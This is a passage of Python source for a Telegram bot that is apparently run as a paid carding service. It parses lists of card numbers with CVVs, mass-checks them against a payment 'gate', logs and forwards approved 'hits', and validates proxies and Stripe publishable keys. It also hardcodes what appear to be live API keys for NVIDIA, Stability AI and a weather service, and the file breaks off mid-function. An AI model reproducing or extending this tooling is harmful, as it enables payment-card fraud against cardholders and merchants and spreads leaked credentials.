                timestamp = dt.strftime("%Y-%m-%d %H:%M:%S")
            except:
                timestamp = str(timestamp)
        else:
            timestamp = "N/A"

        tg_id = data.get('telegram_id')
        wp_link = data.get('whatsapp_link')

        response_text = f"""
┏━━━━━━━⍟
┃ Phone Number Info
┗━━━━━━━━━━━⊛

✧ Truecaller    : <code>{data.get('Truecaller', 'No name found')}</code>
✧ Unknown       : <code>{data.get('Unknown', 'N/A')}</code>

✧ Carrier       : <code>{data.get('carrier', 'N/A')}</code>
✧ Country       : <code>{data.get('country', 'N/A')}</code>
✧ Intl. Format  : <code>{data.get('international_format', 'N/A')}</code>

✧ Location      : <code>{data.get('location', 'N/A')}</code>
✧ Timezones     : <code>{', '.join(data.get('timezones', [])) or 'N/A'}</code>
✧ Timestamp     : <code>{timestamp}</code>
"""

        button_markup = types.InlineKeyboardMarkup()
        if tg_id:
            button_markup.add(types.InlineKeyboardButton("📩 Chat on Telegram", url=f"https://t.me/{tg_id}"))
        if wp_link:
            button_markup.add(types.InlineKeyboardButton("📱 Chat on WhatsApp", url=f"https://wa.me/{wp_link}"))

        bot.send_message(
            message.chat.id,
            response_text.strip(),
            reply_markup=button_markup if button_markup.keyboard else None,
            parse_mode='HTML'
        )

    except Exception as e:
        bot.reply_to(message, f"❌ Unexpected error: {str(e)}")


import io

@bot.message_handler(commands=['open'])
def open_txt_file(message):
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "❌ Please reply to a text file.")
        return

    try:
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text_content = downloaded_file.decode('utf-8')

        # Extract CCs
        ccs = re.findall(r'\d{12,19}[\|\:\/\s]\d{1,2}[\|\:\/\s]\d{2,4}[\|\:\/\s]\d{3,4}', text_content)
        if not ccs:
            bot.reply_to(message, "❌ No CCs found in this file.")
            return

        first_30 = ccs[:30]
        formatted = "\n".join(cc.replace(" ", "|").replace("/", "|").replace(":", "|") for cc in first_30)

        bot.send_message(message.chat.id, f"✅ Found {len(ccs)} CCs.\n\nHere are the first {len(first_30)}:\n<code>{formatted}</code>", parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")



@bot.message_handler(commands=['split'])
def split_txt_file(message):
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "❌ Please reply to a text file.")
        return

    try:
        args = message.text.split()
        if len(args) < 2 or not args[1].isdigit():
            bot.reply_to(message, "❌ Provide the number of parts. Example: /split 5")
            return
        parts = int(args[1])
        if parts <= 0:
            bot.reply_to(message, "❌ Number of parts must be greater than 0.")
            return

        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text_content = downloaded_file.decode('utf-8')

        # Extract CCs
        ccs = re.findall(r'\d{12,19}[\|\:\/\s]\d{1,2}[\|\:\/\s]\d{2,4}[\|\:\/\s]\d{3,4}', text_content)
        if not ccs:
            bot.reply_to(message, "❌ No CCs found in this file.")
            return

        chunk_size = (len(ccs) + parts - 1) // parts
        chunks = [ccs[i:i+chunk_size] for i in range(0, len(ccs), chunk_size)]

        for idx, chunk in enumerate(chunks):
            chunk_text = "\n".join(cc.replace(" ", "|").replace("/", "|").replace(":", "|") for cc in chunk)
            output = io.BytesIO(chunk_text.encode('utf-8'))
            output.name = f'part_{idx+1}.txt'
            bot.send_document(message.chat.id, output)

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def chat_with_nvidia(prompt):
    url = "https://integrate.api.nvidia.com/v1/chat/completions"
    headers = {
        "Authorization": "Bearer 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",
        "Content-Type": "application/json"
    }
    payload = {
        "model": "nvidia/llama3-chatqa-1.5-8b",
        "messages": [{"role": "user", "content": prompt}],
        "temperature": 0.7
    }
    try:
        response = requests.post(url, headers=headers, json=payload)
        data = response.json()
        return data["choices"][0]["message"]["content"]
    except Exception as e:
        return "Error: Unable to contact NVIDIA API."

@bot.message_handler(commands=['ai'])
def handle_ai(message):
    try:
        # Extract the prompt after /ai
        prompt = message.text[len('/ai'):].strip()

        if not prompt:
            bot.reply_to(message, "❌ Please type something after /ai. Example: /ai Tell me a joke!")
            return

        waiting_msg = bot.reply_to(message, "🧠 Thinking...")

        ai_response = chat_with_nvidia(prompt)

        # If response includes code blocks (```...```), handle them specially
        if "```" in ai_response:
            # Telegram Markdown supports code blocks
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=waiting_msg.message_id,
                text=ai_response,
                parse_mode="Markdown"
            )
        else:
            # Normal message
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=waiting_msg.message_id,
                text=f"🧠{ai_response}",
                parse_mode="HTML"
            )

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def schedule_daily_hits():
    # Run every day at 8:00 AM KSA time
    schedule.every().day.at("05:00").do(send_hits_to_admins)  # 5:00 UTC = 8:00 KSA (UTC+3)
    
    while True:
        schedule.run_pending()
        time.sleep(60)

# Start background scheduler thread
scheduler_thread = threading.Thread(target=schedule_daily_hits)
scheduler_thread.daemon = True
scheduler_thread.start()

def check_mx_cc(cc):
    try:
        # Normalize card
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        parts = [p.strip() for p in card.split('|') if p.strip()]

        if len(parts) != 4:
            return {
                'status': 'ERROR',
                'card': card,
                'message': '❌ Invalid format. Please use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Site Base [$5]'
            }

        cc_num, mm, yy, cvv = parts

        if not cc_num.isdigit() or not mm.isdigit() or not yy.isdigit() or not cvv.isdigit():
            return {
                'status': 'ERROR',
                'card': card,
                'message': '❌ Card must be numeric.',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Site Base [$5]'
            }

        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # BIN lookup
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
                brand = bin_info.get('brand', 'UNKNOWN')
                country_name = bin_info.get('country_name', 'UNKNOWN')
                country_flag = bin_info.get('country_flag', '🌐')
                card_type = bin_info.get('type', 'UNKNOWN')
                bank = bin_info.get('bank', 'UNKNOWN')
        except Exception as e:
            print(f"BIN Lookup Error: {e}")

        # API Call
        url = f"http://127.0.0.1:8500/gate=pipeline/key=whoami/cc={formatted_cc.replace('|', '%7C')}"
        response = requests.get(url, timeout=60)
        result = response.json()

        real_status = result.get("status", "DECLINED").upper()
        real_message = result.get("response", "Unknown response")

        # Write HITS if approved
        if real_status == "APPROVED":
            with open("HITS.txt", "a") as f:
                f.write(formatted_cc + "\n")

        return {
            'status': real_status,
            'card': formatted_cc,
            'message': real_message,
            'brand': brand,
            'country': f"{country_name} {country_flag}",
            'type': card_type,
            'gateway': 'Site Base [$5]'
        }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f"❌ Error: {str(e)}",
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Site Base [$5]'
        }

@bot.message_handler(commands=['mx'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mx'))
def handle_mx(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from message or reply
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                if message.reply_to_message:
                    cc = message.reply_to_message.text.strip()
                else:
                    bot.reply_to(message, "❌ Invalid format. Use /mx CC|MM|YYYY|CVV or .mx CC|MM|YYYY|CVV")
                    return
            else:
                cc = parts[1]
        else:
            cc = message.text[4:].strip()

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Site Base [5$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_mx_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto forward hits
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - /mx] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
    
@bot.message_handler(commands=['mmx'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mmx'))
def handle_mmx(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return

    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in correct format (CC|MM|YY|CVV).")
            return

        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT

        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')

        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        card_start_time = time.time()
                        result = check_mx_cc(card)

                        processing_time = time.time() - card_start_time
                        if processing_time < 10:
                            time.sleep(10 - processing_time)

                        results.append(result)

                        total_processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), total_processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                              message_id=status_msg.message_id,
                                              text=response_text,
                                              parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Site Base [$5]'
                        })

                        total_processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), total_processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                              message_id=status_msg.message_id,
                                              text=response_text,
                                              parse_mode='HTML')

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')

        threading.Thread(target=check_cards).start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

@bot.message_handler(commands=['lk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.lk'))
def handle_lk(message):
    # Restrict usage for non-subscribed users in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs..")
        return

    # Restrict usage in unapproved groups
    if message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot. Send the group username and chat ID to @SongPY for approval.")
        return

    try:
        # Extract card from command or reply
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                if message.reply_to_message:
                    card_input = message.reply_to_message.text.strip()
                else:
                    bot.reply_to(message, "❌ Invalid format. Use /lk CC|MM|YYYY|CVV or .lk CC|MM|YY|CVV")
                    return
            else:
                card_input = parts[1]
        else:
            card_input = message.text[4:].strip()

        # Validate card input format
        card_pattern = r'^(\d{13,16})[|](\d{1,2})[|](\d{2,4})[|](\d{3,4})$'
        match = re.match(card_pattern, card_input)
        if not match:
            bot.reply_to(message, "❌ Invalid format. Use CC|MM|YYYY|CVV or CC|MM|YY|CVV")
            return

        # Extract components
        card_number, month, year, cvv = match.groups()
        month = month.zfill(2)  # Ensure month is 2 digits
        if len(year) == 2:  # Convert 2-digit year to 4-digit year
            year = "20" + year

        # Validate card number length
        if len(card_number) < 13 or len(card_number) > 19:
            bot.reply_to(message, "❌ Invalid card number. Card number must be between 13 and 19 digits.")
            return

        # Check if card number is valid using the Luhn algorithm
        def luhn_algorithm(card_num):
            sum_ = 0
            alt = False
            for digit in reversed(card_num):
                d = int(digit)
                if alt:
                    d *= 2
                    if d > 9:
                        d -= 9
                sum_ += d
                alt = not alt
            return sum_ % 10 == 0

        if not luhn_algorithm(card_number):
            bot.reply_to(message, "❌ Card number is invalid based on the Luhn algorithm.")
            return

        # Validate month and year
        if int(month) < 1 or int(month) > 12:
            bot.reply_to(message, "❌ Invalid expiration month. Please provide a valid month (01-12).")
            return

        current_year = datetime.now().year
        current_month = datetime.now().month
        if int(year) < current_year or (int(year) == current_year and int(month) < current_month):
            bot.reply_to(message, "❌ The card has expired.")
            return

        # Extract BIN (first 6 digits)
        bin_number = card_number[:6]

        # Fetch BIN details
        status_msg = bot.reply_to(message, f"🔍 Checking BIN {bin_number}... Please wait.")
        try:
            response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
            if response.status_code == 200:
                bin_data = response.json()
                issuing_bank = bin_data.get('bank', 'N/A')
                card_type = bin_data.get('type', 'N/A')
                card_brand = bin_data.get('brand', 'N/A')
                country = bin_data.get('country_name', 'N/A')
                flag = bin_data.get('country_flag', '🌐')

                # Format the response
                reply = f"""
┏━━━━━━━⍟
┃ 𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽 ✅
┗━━━━━━━━━━━⊛

❖ 𝗖𝗔𝗥𝗗 ➳ <code>{card_number}</code>
❖ 𝗩𝗔𝗟𝗜𝗗 ➳ ✅
❖ 𝗘𝗫𝗣𝗜𝗥𝗬 ➳ {month}/{year}

❖ 𝗕𝗜𝗡 ➳ <code>{bin_number}</code>
❖ 𝗕𝗔𝗡𝗞 ➳ {issuing_bank}
❖ 𝗕𝗥𝗔𝗡𝗗 ➳ {card_brand}
❖ 𝗧𝗬𝗣𝗘 ➳ {card_type}
❖ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➳ {country} {flag}
"""
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=reply,
                                      parse_mode='HTML')
            else:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ Could not retrieve BIN details for {bin_number}.")
        except Exception as e:
            bot.edit_message_text(chat_id=message.chat.id,
                                  message_id=status_msg.message_id,
                                  text=f"❌ Error fetching BIN details: {str(e)}")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

import requests

@bot.message_handler(commands=['ip'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.ip'))
def handle_ip_lookup(message):
    # DM and group access control
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. Use in our group @stormxvup or subscribe.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    # Extract IP from command or reply
    if message.text.startswith('/'):
        parts = message.text.split()
        if len(parts) < 2:
            if message.reply_to_message:
                ip = message.reply_to_message.text.strip()
            else:
                bot.reply_to(message, "❌ Usage: /ip <ip_address> or reply with .ip to IP.")
                return
        else:
            ip = parts[1]
    else:
        ip = message.text[4:].strip()

    status_msg = bot.reply_to(message, "🔍 Fetching IP details... Please wait...")

    def fetch_ip_info():
        try:
            res = requests.get(f"http://ip-api.com/json/{ip}").json()
            if res.get("status") != "success":
                raise Exception(res.get("message", "Invalid IP"))

            final_msg = f"""
┏━━━━━━━⍟
┃ 𝗜𝗣 𝗜𝗻𝗳𝗼 ✅
┗━━━━━━━━━━━⊛

❖ 𝗜𝗣 ➳ <code>{res['query']}</code>
❖ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➳ {res['country']} {res['countryCode']}
❖ 𝗥𝗘𝗚𝗜𝗢𝗡 ➳ {res['regionName']}

❖ 𝗖𝗜𝗧𝗬 ➳ {res['city']}
❖ 𝗜𝗦𝗣 ➳ {res['isp']}
❖ 𝗢𝗥𝗚 ➳ {res['org']}

❖ 𝗧𝗜𝗠𝗘𝗭𝗢𝗡𝗘 ➳ {res['timezone']}
❖ 𝗟𝗔𝗧 ➳ {res['lat']}
❖ 𝗟𝗢𝗡𝗚 ➳ {res['lon']}
""".strip()

            bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id,
                                  text=final_msg, parse_mode='HTML')
        except Exception as e:
            bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id,
                                  text=f"❌ Failed to get IP info: {str(e)}")

    threading.Thread(target=fetch_ip_info).start()

import socket
import requests

@bot.message_handler(commands=['host'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.host'))
def handle_host_lookup(message):
    # Access control
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. Use in @stormxvup or subscribe.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    # Extract host
    if message.text.startswith('/'):
        parts = message.text.split()
        if len(parts) < 2:
            if message.reply_to_message:
                host = message.reply_to_message.text.strip()
            else:
                bot.reply_to(message, "❌ Usage: /host <hostname or url>")
                return
        else:
            host = parts[1]
    else:
        host = message.text[6:].strip()

    host = host.replace("http://", "").replace("https://", "").split("/")[0]

    status_msg = bot.reply_to(message, "🔍 Fetching host details... Please wait...")

    def fetch_host_info():
        try:
            # Resolve IP
            ip = socket.gethostbyname(host)

            # IP Details
            ipinfo = requests.get(f"http://ip-api.com/json/{ip}").json()
            if ipinfo.get("status") != "success":
                raise Exception("Failed to get IP details")

            # Reverse domain list
            rev_resp = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={host}").text
            if "error" in rev_resp.lower() or "no records" in rev_resp.lower():
                domains = ["No domains found"]
            else:
                domains = rev_resp.strip().splitlines()

            formatted_domains = "\n".join(f"• {d}" for d in domains[:10])

            final_msg = f"""
┏━━━━━━━⍟
┃ 𝗛𝗼𝘀𝘁 𝗜𝗻𝗳𝗼 ✅
┗━━━━━━━━━━━⊛

❖ 𝗛𝗢𝗦𝗧 ➳ <code>{host}</code>
❖ 𝗜𝗣 ➳ <code>{ip}</code>
❖ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➳ {ipinfo['country']} {ipinfo['countryCode']}

❖ 𝗥𝗘𝗚𝗜𝗢𝗡 ➳ {ipinfo['regionName']}
❖ 𝗖𝗜𝗧𝗬 ➳ {ipinfo['city']}
❖ 𝗜𝗦𝗣 ➳ {ipinfo['isp']}

❖ 𝗢𝗥𝗚 ➳ {ipinfo['org']}
❖ 𝗧𝗜𝗠𝗘𝗭𝗢𝗡𝗘 ➳ {ipinfo['timezone']}
""".strip()

            bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id,
                                  text=final_msg, parse_mode='HTML')

        except Exception as e:
            bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id,
                                  text=f"❌ Failed to get host info: {str(e)}")

    threading.Thread(target=fetch_host_info).start()

@bot.message_handler(commands=['img'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.img'))
def handle_img(message):
    # Restrict bot usage in DMs for unauthorized users
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    # Extract prompt from command
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        bot.reply_to(message, "❌ Usage: /img <prompt>")
        return

    prompt = command_parts[1]

    # Notify user about image generation
    status_msg = bot.reply_to(message, f"🔍 Generating image for: <code>{prompt}</code>", parse_mode="HTML")

    # Function to generate image using Stability AI API
    def generate_image():
        try:
            api_key = "sk-9tonJ6V2D0q65SVMDULtMExuRrcM8cLb3JMuDBAN5TpvJX1Q"
            url = "https://api.stability.ai/v2beta/stable-image/generate/ultra"
            headers = {
                "Authorization": f"Bearer {api_key}",
                "Accept": "image/*",
            }
            data = {
                "prompt": prompt,
                "output_format": "webp",  # can be png, jpeg, webp
            }
            files = {'file': ('', '')}

            response = requests.post(url, headers=headers, data=data, files=files)

            if response.status_code == 200:
                # Save the generated image locally
                file_name = f"{prompt.replace(' ', '_')}.webp"
                with open(file_name, "wb") as f:
                    f.write(response.content)

                # Delete "Generating" message and send the image with a caption
                bot.delete_message(chat_id=message.chat.id, message_id=status_msg.message_id)
                bot.send_photo(
                    chat_id=message.chat.id,
                    photo=open(file_name, "rb"),
                    caption=(
                        f"🖼️ Image generated using Stability AI\n\n"
                        f"✧ Prompt: <code>{prompt}</code>\n"
                        f"✧ Model: Stability AI v2 Beta\n"
                        f"✧ Generated by: @{bot.get_me().username}\n"
                    ),
                    parse_mode="HTML"
                )
            else:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=f"❌ Failed to generate image: {response.status_code} - {response.text}",
                    parse_mode="HTML"
                )

        except Exception as e:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                text=f"❌ Error generating image: {str(e)}",
                parse_mode="HTML"
            )

    threading.Thread(target=generate_image).start()

@bot.message_handler(commands=['prochk'])
def proxy_checker(message):
    # Restrict usage in DMs for non-subscribers
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is locked in DMs. Join our group @stormxvup or subscribe to use it in private.")
        return

    # Restrict usage in unapproved groups
    if message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.\nSend @SongPY the group username and chat ID to get approved.")
        return

    proxies_text = message.text.split('\n')[1:]
    if not proxies_text:
        bot.reply_to(message, "❌ Please send proxies after the command.\nExample:\n/prochk\n1.1.1.1:8080\n8.8.8.8:3128")
        return

    live = []
    dead = []

    status_msg = bot.reply_to(message, "🔍 Checking proxies...\n✅ Live: 0\n❌ Dead: 0\n⏳ Progress: 0/{}".format(len(proxies_text)))

    for idx, proxy in enumerate(proxies_text, start=1):
        proxy = proxy.strip()
        if not proxy:
            continue

        proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }

        try:
            r = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=5)
            if r.status_code == 200:
                live.append(proxy)

                ip, port = proxy.split(':')
                bot.send_message(
                    message.chat.id,
                    f"""┏━━━━━━━⍟
┃ LIVE PROXY ✅ 
┗━━━━━━━━━━━⊛

❖ 𝗩𝗔𝗟𝗜𝗗: ✅
❖ IP   : <code>{ip}</code>
❖ PORT  : <code>{port}</code>
""",
                    parse_mode="HTML"
                )
            else:
                dead.append(proxy)
        except:
            dead.append(proxy)

        # Live edit progress message
        try:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                text=f"""🔍 Checking proxies...
✅ Live: {len(live)}
❌ Dead: {len(dead)}
⏳ Progress: {idx}/{len(proxies_text)}
""")
        except:
            pass

    # Final summary
    final_text = "🧹 <b>Proxy Check Finished</b>\n\n"
    if live:
        final_text += "✅ <b>Live Proxies:</b>\n" + "\n".join(live) + "\n\n"
    if dead:
        final_text += "❌ <b>Dead Proxies:</b>\n" + "\n".join(dead)

    bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=final_text.strip(), parse_mode="HTML")


@bot.message_handler(commands=['pk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.pk'))
def handle_pk_check(message):
    # Restrict in DMs and unapproved groups
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    # Flood control
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands.")
        return

    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /pk <pk_key>")
            return
        pk_key = parts[1]

        status_msg = bot.reply_to(message, "🔍 Checking PK key...")

        def check_pk():
            try:
                headers = {
                    "Authorization": f"{pk_key}",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                data = "type=card&card[number]=4242424242424242&card[exp_month]=12&card[exp_year]=2030&card[cvc]=123"
                r = requests.post("https://api.stripe.com/v1/tokens", headers={"Authorization": f"Bearer {pk_key}"}, data=data, timeout=20)

                if r.status_code == 200 and "id" in r.json():
                    token_id = r.json().get("id")
                    msg = f"""
┏━━━━━━━⍟
┃ PK Key Info
┗━━━━━━━━━━━⊛

✧ Token       : <code>{token_id}</code>
✧ Type        : <code>Publishable Key</code>
✧ Key Status  : <b>✅ LIVE</b>
✧ Checked Key : <code>{pk_key}</code>
"""
                elif r.status_code == 401:
                    msg = f"""
┏━━━━━━━⍟
┃ PK Key Info
┗━━━━━━━━━━━⊛

✧ Status      : <b>❌ DEAD / INVALID</b>
✧ Checked Key : <code>{pk_key}</code>
"""
                else:
                    msg = f"""
┏━━━━━━━⍟
┃ PK Key Info
┗━━━━━━━━━━━⊛

✧ Status      : ⚠️ UNKNOWN ({r.status_code})
✧ Checked Key : <code>{pk_key}</code>
"""

                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=msg.strip(),
                                      parse_mode="HTML")
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ Error checking key: <code>{str(e)}</code>",
                                      parse_mode="HTML")

        threading.Thread(target=check_pk).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


# Your weather API key
api_key = '907913fb77176b0f27ebfbcf123e588f'

# Optional log function (prevent crash)
def log_bot_activity(message):
    print(f"[LOG] {message.chat.id} used command: {message.text}")

api_key = '907913fb77176b0f27ebfbcf123e588f'

def log_bot_activity(message):
    print(f"[LOG] {message.chat.id} used command: {message.text}")

# /wh command (public + private)
@bot.message_handler(commands=['wh'])
def handle_weather_command(message):
    try:
        city = message.text.split(' ', 1)[1]
    except IndexError:
        bot.reply_to(message, "❗ Please enter a city name.\nExample: `/wh London`", parse_mode="Markdown")
        return

    send_weather(message, city)

# .wh command (DM only)
@bot.message_handler(func=lambda message: message.text and message.text.lower().startswith('.wh'))
def handle_weather_dm(message):
